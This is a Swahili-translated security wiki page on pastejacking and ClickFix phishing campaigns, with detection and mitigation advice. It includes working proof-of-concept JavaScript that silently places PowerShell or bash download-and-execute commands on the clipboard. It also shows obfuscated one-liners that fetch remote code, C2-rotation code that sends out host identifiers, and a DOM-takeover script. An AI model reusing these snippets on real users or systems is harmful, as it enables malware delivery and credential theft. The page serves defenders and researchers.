# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Usibandike chochote usichokikopi mwenyewe." – ushauri wa zamani lakini bado sahihi

## Muhtasari

Clipboard hijacking – pia inayoitwa *pastejacking* – inatumia ukweli kwamba watumiaji kwa kawaida hunakili na kubandika amri bila kuzichunguza. Ukurasa wa wavuti mbaya (au muktadha wowote unaoweza kuendesha JavaScript kama Electron au Desktop application) kwa njia ya programu huweka maandishi yaliyodhibitiwa na mshambuliaji ndani ya clipboard ya mfumo. Waathiriwa huhimizwa, kawaida kwa maelekezo ya uhandisi wa kijamii yaliyotengenezwa kwa ustadi, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *bandika* yaliyomo kwenye clipboard, mara moja kutekeleza amri haribifu.

Kwa sababu **hakuna faili inayopakuliwa na hakuna attachment inayofunguliwa**, mbinu hii inaepuka udhibiti mwingi wa usalama wa barua pepe na maudhui ya wavuti ambao hufuatilia attachments, macros au utekelezaji wa amri moja kwa moja. Kwa hiyo shambulio hili ni maarufu katika kampeni za phishing zinazowasilisha familia za malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.

## JavaScript Uthibitisho wa Dhana
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, mpya zikitegemea **Clipboard API** isiyo sambamba (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Mtumiaji anatembelea tovuti ya typosquatted au compromised (mfano `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyotekewa inaita helper `unsecuredCopyToClipboard()` ambayo kwa ukimya inaweka Base64-encoded PowerShell one-liner kwenye clipboard.
3. Maelekezo ya HTML yanaambia mwathiriwa: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter kutatua tatizo.”*
4. `powershell.exe` inaendesha, ikipakua archive inayojumuisha executable halali pamoja na DLL yenye madhara (classic DLL sideloading).
5. Loader inafungua hatua za ziada (ina-decrypt), inaingiza shellcode na inasakinisha persistence (mfano scheduled task) — hatimaye ikiwasha NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart halali) inatafuta kwenye saraka yake faili `msvcp140.dll`.
* DLL haribifu inapata APIs kwa wakati wa utekelezaji kwa kutumia **GetProcAddress**, inapakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, inazifungua kwa kutumia rolling XOR key `"https://google.com/"`, inaingiza shellcode ya mwisho na kuzipakua **client32.exe** (NetSupport RAT) hadi `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa **curl.exe**
2. Inakimbiza JScript downloader ndani ya **cscript.exe**
3. Inapata MSI payload → inaweka `libcef.dll` kando ya signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Kiito cha **mshta** kinaendesha script ya PowerShell iliyofichwa inayopakua `PartyContinued.exe`, inatoa `Boat.pst` (CAB), kujenga tena `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, na hatimaye inaendesha script ya `.a3x` ambayo inatoa kwa siri taarifa za kuingia za kivinjari kwa `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Baadhi ya kampeni za ClickFix hupuuza kabisa upakuaji wa faili na kuwaamrisha waathirika kubandika mstari mmoja (one‑liner) unaopakua na kuendesha JavaScript kupitia WSH, kuufanya udumu, na kubadilisha C2 kila siku. Mfano wa mnyororo ulioshuhudiwa:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa iliyorejeshwa kinyume wakati wa runtime ili kuzuia ukaguzi wa kawaida.
- JavaScript inajidumu kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa — kuziwezesha domain rotation kwa kasi.

Fragment ndogo ya JS inayotumika kuzungusha C2s kwa tarehe:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata kwa kawaida hurusha loader inayoweka persistence na kuvuta RAT (mfano, PureHVNC), mara nyingi ikifunga TLS kwa hardcoded certificate na kukata traffic kwa vipande.

Detection ideas specific to this variant
- Mti wa mchakato: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Vielelezo vya kuanzisha: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayoita WScript/CScript na JS path chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na telemetry ya mstari‑wa‑amri zenye `.split('').reverse().join('')` au `eval(a.responseText)`.
- Kurudia `powershell -NoProfile -NonInteractive -Command -` zenye stdin payloads kubwa ili kuendesha scripts ndefu bila mistari ndefu ya amri.
- Kazi Zilizopangwa (Scheduled Tasks) ambazo baadaye zinaendesha LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya kazi/rajisi inayotokea kuwa updater (mfano, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Majina ya C2 yanayozunguka kila siku na URLs zenye muundo `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Patanisha matukio ya kuandika clipboard ikifuatwa na Win+R paste kisha mara moja utekelezaji wa `powershell.exe`.

Timu za blue zinaweza kuchanganya telemetry ya clipboard, uundaji wa mchakato na registry ili kubaini matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` inahifadhi historia ya **Win + R** amri – tafuta entries zisizo za kawaida za Base64 / obfuscated.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa uundaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda kabla kabisa ya tukio la 4688 la kushukiwa.
* EDR clipboard sensors (ikiwa zipo) – patanisha `Clipboard Write` ikifuatwa mara moja na mchakato mpya wa PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Kampeni za hivi karibuni zinazalisha kwa wingi kurasa za udanganyifu za CDN/browser za uthibitisho ("Just a moment…", IUAM-style) ambazo zinawalazimisha watumiaji kunakili amri maalum za OS kutoka clipboard yao na kuziweka kwenye native consoles. Hii inaondoa utekelezaji kutoka kwenye browser sandbox na inafanya kazi kwa Windows na macOS.

Key traits of the builder-generated pages
- Ugundaji wa OS kupitia `navigator.userAgent` ili kubadilisha payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops ya hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Kunakili kwa clipboard moja kwa moja kwenye vitendo vya UI visivyo hatari (checkbox/Copy) wakati maandishi yanayoonekana yanaweza kutofautiana na yaliyomo kwenye clipboard.
- Kuzuia mobile na popover yenye maelekezo hatua‑kwa‑hatua: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation ya hiari na injector ya single-file ili kuandika upya DOM ya tovuti iliyodukuliwa na verification UI yenye Tailwind styling (hakuna usajili mpya wa domain unahitajika).

Mfano: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence ya utekelezaji wa awali
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, kupunguza athari zinazoonekana.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Wazo za kugundua na kuwindia maalum kwa vishawishi vya mtindo wa IUAM
- Web: Kurasa ambazo zinabind Clipboard API kwa verification widgets; kutokufanana kati ya maandishi yanayoonekana na clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace katika muktadha unaoshukuwa.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` sekunde chache baada ya mwingiliano wa browser; batch/MSI installers zinazoendeshwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm zinazozalisha `bash`/`curl`/`base64 -d` zikiwa na `nohup` karibu na matukio ya browser; kazi za background zinazoendelea kufanya kazi baada ya kufunga terminal.
- Changanisha historia ya `RunMRU` Win+R na maandishi ya clipboard na uundaji wa mchakato wa console uliofuata.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Kupunguza Hatari

1. Kujenga usalama wa kivinjari – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) au hitaji la ishara ya mtumiaji.
2. Uhamasishaji wa usalama – fundisha watumiaji wa *kuandika* amri nyeti au kuzibandika kwanza kwenye mhariri wa maandishi.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia one-liners zisizoidhinishwa.
4. Udhibiti wa mtandao – zuia ombi za kutoka nje kwenda domain za pastejacking na malware C2 zinazojulikana.

## Mbinu Zinazohusiana

* **Discord Invite Hijacking** mara nyingi hutumia njia ile ile ya ClickFix baada ya kuwavutia watumiaji kwenye server hatarishi:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Marejeo

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
